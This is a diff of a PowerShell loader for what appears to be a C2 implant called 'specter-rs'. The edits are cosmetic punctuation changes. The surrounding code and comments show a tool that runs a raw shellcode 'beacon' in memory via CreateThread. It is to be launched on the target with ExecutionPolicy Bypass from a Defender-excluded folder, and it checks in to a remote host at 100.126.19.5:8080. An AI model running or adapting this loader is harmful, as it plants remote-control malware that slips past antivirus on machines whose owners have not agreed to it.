@@ -1,4 +1,4 @@
-# specter-rs demo loader (PowerShell) — run the raw PIC blob on Windows.
+# specter-rs demo loader (PowerShell) - run the raw PIC blob on Windows.
 #
 # The beacon artifact is a raw position-independent .text blob (not a PE):
 # SptEntry is its FIRST byte and never returns. The loader copies the blob
@@ -8,7 +8,7 @@
 # Usage (from the target machine, inside the Defender-excluded folder):
 #   powershell -ExecutionPolicy Bypass -File run_blob.ps1 -Blob .\specter-demo.bin
 #
-# The beacon writes its debug log (specter.log) into the CURRENT directory —
+# The beacon writes its debug log (specter.log) into the CURRENT directory -
 # run it from the folder where you want the log.
 
 param(
@@ -54,7 +54,7 @@ $thread = [SptLoader]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $base, [Int
 if ($thread -eq [IntPtr]::Zero) {
     throw ("CreateThread failed (error {0})" -f [Runtime.InteropServices.Marshal]::GetLastWin32Error())
 }
-Write-Host ("[+] beacon thread {0} running — check-in target 100.126.19.5:8080" -f $tid)
+Write-Host ("[+] beacon thread {0} running - check-in target 100.126.19.5:8080" -f $tid)
 Write-Host "[+] waiting (Ctrl+C to stop); the beacon sleeps 30s between check-ins"
 
 [SptLoader]::WaitForSingleObject($thread, [uint32]0xFFFFFFFF) | Out-Null
